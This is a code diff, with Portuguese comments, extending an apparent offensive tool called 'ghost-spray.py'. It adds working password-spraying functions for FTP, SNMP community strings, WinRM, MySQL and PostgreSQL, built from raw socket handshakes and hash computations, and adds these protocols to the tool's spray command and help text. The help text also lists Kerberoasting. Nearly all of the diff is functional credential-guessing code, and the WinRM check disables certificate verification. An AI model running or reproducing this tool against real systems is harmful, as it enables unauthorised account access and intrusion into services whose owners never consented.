@@ -598,6 +598,213 @@ def _testar_o365_oauth(usuario, senha, timeout=10):
         return False, None
 
 
+def _testar_ftp(host, porta, usuario, senha, timeout=5):
+    """Testa autenticacao FTP via socket raw (RFC 959)."""
+    try:
+        sock = socket.create_connection((host, int(porta)), timeout=timeout)
+        banner = sock.recv(256)
+        if not banner.startswith(b"220"):
+            sock.close()
+            return False, "NO_BANNER"
+        sock.sendall(f"USER {usuario}\r\n".encode())
+        resp_user = sock.recv(256).decode("utf-8", errors="ignore")
+        if resp_user.startswith("530"):
+            sock.close()
+            return False, 530
+        sock.sendall(f"PASS {senha}\r\n".encode())
+        resp_pass = sock.recv(256).decode("utf-8", errors="ignore")
+        sock.sendall(b"QUIT\r\n")
+        sock.close()
+        code = int(resp_pass[:3]) if resp_pass[:3].isdigit() else 0
+        if code == 230:
+            return True, 230
+        if code == 530:
+            return False, 530
+        return False, code
+    except Exception:
+        return False, None
+
+
+def _testar_snmp(host, porta, comunidade, timeout=3):
+    """Testa community string SNMP v1/v2c via GetRequest UDP."""
+    # SNMP GetRequest para OID sysDescr (1.3.6.1.2.1.1.1.0)
+    def _build_get(comm):
+        comm_b = comm.encode()
+        oid = b"\x30\x0d\x06\x09\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00"
+        pdu = b"\xa0" + bytes([len(oid) + 12]) + b"\x02\x01\x01\x02\x01\x00\x02\x01\x00" + b"\x30" + bytes([len(oid)]) + oid
+        comm_field = b"\x04" + bytes([len(comm_b)]) + comm_b
+        msg = b"\x02\x01\x01" + comm_field + pdu
+        return b"\x30" + bytes([len(msg)]) + msg
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(timeout)
+        pkt = _build_get(comunidade)
+        sock.sendto(pkt, (host, int(porta)))
+        resp, _ = sock.recvfrom(1024)
+        sock.close()
+        if resp and len(resp) > 10:
+            return True, "SNMP_RESP"
+        return False, None
+    except socket.timeout:
+        return False, "TIMEOUT"
+    except Exception:
+        return False, None
+
+
+def _testar_winrm(host, porta, usuario, senha, timeout=10):
+    """Testa autenticacao WinRM (HTTP Basic/NTLM) via HTTP."""
+    import base64 as _b64, ssl as _ssl
+    porta = int(porta)
+    scheme = "https" if porta == 5986 else "http"
+    url = f"{scheme}://{host}:{porta}/wsman"
+    cred = _b64.b64encode(f"{usuario}:{senha}".encode()).decode()
+    # Envia SOAP Identify request
+    soap = (
+        b'<?xml version="1.0" encoding="UTF-8"?>'
+        b'<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
+        b'xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd">'
+        b'<s:Body><wsmid:Identify/></s:Body></s:Envelope>'
+    )
+    import urllib.request as _ur
+    req = _ur.Request(url, data=soap, method="POST", headers={
+        "Content-Type": "application/soap+xml;charset=UTF-8",
+        "Authorization": f"Basic {cred}",
+        "User-Agent": "GhostSpray/1.0",
+    })
+    ctx = _ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    try:
+        with _ur.urlopen(req, timeout=timeout, context=ctx) as r:
+            if r.status == 200:
+                return True, 200
+            return False, r.status
+    except _ur.error.HTTPError as e:
+        if e.code == 401:
+            return False, 401
+        return False, e.code
+    except Exception:
+        return False, None
+
+
+def _testar_mysql(host, porta, usuario, senha, timeout=5):
+    """Testa autenticacao MySQL Native Password via handshake socket."""
+    import hashlib as _hl, struct as _st
+    try:
+        sock = socket.create_connection((host, int(porta)), timeout=timeout)
+        # Ler handshake inicial
+        data = b""
+        while len(data) < 4:
+            chunk = sock.recv(4 - len(data))
+            if not chunk:
+                break
+            data += chunk
+        pkt_len = _st.unpack_from("<I", data[:3] + b"\x00")[0]
+        payload = b""
+        while len(payload) < pkt_len:
+            chunk = sock.recv(pkt_len - len(payload))
+            if not chunk:
+                break
+            payload += chunk
+        if not payload or payload[0] != 0x0a:
+            sock.close()
+            return False, "BAD_HANDSHAKE"
+        # Extrair salt (challenge)
+        idx = payload.index(b"\x00", 1) + 1
+        salt1 = payload[idx:idx+8]
+        idx2 = idx + 8 + 1 + 2 + 1 + 2 + 2 + 1 + 10
+        salt2 = payload[idx2:idx2+12] if len(payload) > idx2 + 12 else b""
+        salt = salt1 + salt2
+        # Calcular hash MySQL_Native_Password
+        h1 = _hl.sha1(senha.encode()).digest()
+        h2 = _hl.sha1(h1).digest()
+        h3 = _hl.sha1(salt + h2).digest()
+        auth_resp = bytes(a ^ b for a, b in zip(h1, h3))
+        # Montar HandshakeResponse41
+        usr_b = usuario.encode() + b"\x00"
+        db_b = b"\x00"
+        plugin_b = b"mysql_native_password\x00"
+        cap = 0x000AA285
+        resp_body = (_st.pack("<I", cap) + _st.pack("<I", 0xFFFFFF) +
+                     b"\x21" + b"\x00" * 23 + usr_b + bytes([len(auth_resp)]) +
+                     auth_resp + db_b + plugin_b)
+        hdr = _st.pack("<I", len(resp_body))[:3] + b"\x01"
+        sock.sendall(hdr + resp_body)
+        reply = sock.recv(256)
+        sock.close()
+        if reply and reply[4:5] == b"\x00":
+            return True, "AUTH_OK"
+        if reply and reply[4:5] == b"\xff":
+            err = reply[7:9]
+            code = _st.unpack("<H", err)[0] if len(err) >= 2 else 0
+            if code == 1045:
+                return False, 1045
+            return False, code
+        return False, None
+    except Exception:
+        return False, None
+
+
+def _testar_postgres(host, porta, usuario, senha, timeout=5, database="postgres"):
+    """Testa autenticacao PostgreSQL via startup + MD5 auth."""
+    import hashlib as _hl, struct as _st
+    try:
+        sock = socket.create_connection((host, int(porta)), timeout=timeout)
+        # StartupMessage
+        params = f"user\x00{usuario}\x00database\x00{database}\x00\x00"
+        msg = _st.pack(">I", len(params) + 8) + _st.pack(">I", 196608) + params.encode()
+        sock.sendall(msg)
+        # Ler resposta
+        hdr = sock.recv(5)
+        if len(hdr) < 5:
+            sock.close()
+            return False, "SHORT_RESP"
+        mtype = chr(hdr[0])
+        mlen = _st.unpack(">I", hdr[1:5])[0]
+        body = sock.recv(mlen - 4)
+        if mtype == "E":
+            sock.close()
+            return False, "PG_ERROR"
+        if mtype == "R":
+            auth_type = _st.unpack(">I", body[:4])[0]
+            if auth_type == 0:
+                # Auth ok sem senha
+                sock.close()
+                return True, "AUTH_OK"
+            if auth_type == 5:
+                # MD5
+                salt = body[4:8]
+                md5_1 = _hl.md5((senha + usuario).encode()).hexdigest()
+                md5_2 = _hl.md5((md5_1.encode() + salt)).hexdigest()
+                pw = ("md5" + md5_2 + "\x00").encode()
+                pmsg = b"p" + _st.pack(">I", len(pw) + 4) + pw
+                sock.sendall(pmsg)
+                hdr2 = sock.recv(5)
+                body2 = sock.recv(max(1, _st.unpack(">I", hdr2[1:5])[0] - 4))
+                sock.close()
+                mtype2 = chr(hdr2[0])
+                if mtype2 == "R" and _st.unpack(">I", body2[:4])[0] == 0:
+                    return True, "AUTH_OK"
+                return False, "WRONG_PASS"
+            if auth_type == 3:
+                # CleartextPassword
+                pw = (senha + "\x00").encode()
+                pmsg = b"p" + _st.pack(">I", len(pw) + 4) + pw
+                sock.sendall(pmsg)
+                hdr2 = sock.recv(5)
+                body2 = sock.recv(max(1, _st.unpack(">I", hdr2[1:5])[0] - 4))
+                sock.close()
+                mtype2 = chr(hdr2[0])
+                if mtype2 == "R" and _st.unpack(">I", body2[:4])[0] == 0:
+                    return True, "AUTH_OK"
+                return False, "WRONG_PASS"
+        sock.close()
+        return False, f"UNEXPECTED_{mtype}"
+    except Exception:
+        return False, None
+
+
 def gerar_usuarios(primeiros_nomes, ultimos_nomes, pattern="fi.ln"):
     """Gera lista de usernames a partir de nomes com base em um padrao."""
     usuarios = []
@@ -730,6 +937,22 @@ def password_spray(alvo, usuarios, senhas, protocolo="http", timeout=5,
         elif protocolo == "smb":
             host, porta = (alvo.split(":") + ["445"])[:2]
             ok, code = _testar_smb(host, usuario, senha, porta=int(porta), timeout=timeout)
+        elif protocolo == "ftp":
+            host, porta = (alvo.split(":") + ["21"])[:2]
+            ok, code = _testar_ftp(host, porta, usuario, senha, timeout=timeout)
+        elif protocolo == "snmp":
+            host, porta = (alvo.split(":") + ["161"])[:2]
+            # Para SNMP, usuario = community string
+            ok, code = _testar_snmp(host, porta, usuario, timeout=timeout)
+        elif protocolo == "winrm":
+            host, porta = (alvo.split(":") + ["5985"])[:2]
+            ok, code = _testar_winrm(host, porta, usuario, senha, timeout=timeout)
+        elif protocolo == "mysql":
+            host, porta = (alvo.split(":") + ["3306"])[:2]
+            ok, code = _testar_mysql(host, porta, usuario, senha, timeout=timeout)
+        elif protocolo == "postgres":
+            host, porta = (alvo.split(":") + ["5432"])[:2]
+            ok, code = _testar_postgres(host, porta, usuario, senha, timeout=timeout)
         else:
             ok, code = False, None
 
@@ -1081,7 +1304,7 @@ _SPRAY_HELP = """\033[92mComandos disponiveis:\033[0m
   \033[1mkerberoast\033[0m         Kerberoasting via AS-REQ sem autenticacao
 
 \033[92mProtocolos suportados:\033[0m
-  http  https  smtp  ldap  ssh  owa  o365  okta  smb
+  http  https  smtp  ldap  ssh  owa  o365  okta  smb  ftp  snmp  winrm  mysql  postgres
 
 \033[92mExemplos:\033[0m
   python ghost-spray.py spray -t https://app.com --userlist users.txt --passlist pass.txt
@@ -1108,7 +1331,7 @@ def main():
     # spray
     p_spray = sub.add_parser("spray", help="Password spraying (uma senha por vez, todos os usuarios)")
     p_spray.add_argument("-t", "--target", required=True, help="Alvo: URL ou host:porta")
-    p_spray.add_argument("--protocol", choices=["http", "https", "smtp", "ldap", "ssh", "owa", "o365", "okta", "smb"],
+    p_spray.add_argument("--protocol", choices=["http", "https", "smtp", "ldap", "ssh", "owa", "o365", "okta", "smb", "ftp", "snmp", "winrm", "mysql", "postgres"],
                           default="http", help="Protocolo (padrao: http)")
     p_spray.add_argument("--userlist", default=None, help="Arquivo com lista de usuarios (ou use --gen-users)")
     p_spray.add_argument("--passlist", help="Arquivo com lista de senhas (padrao: lista interna)")
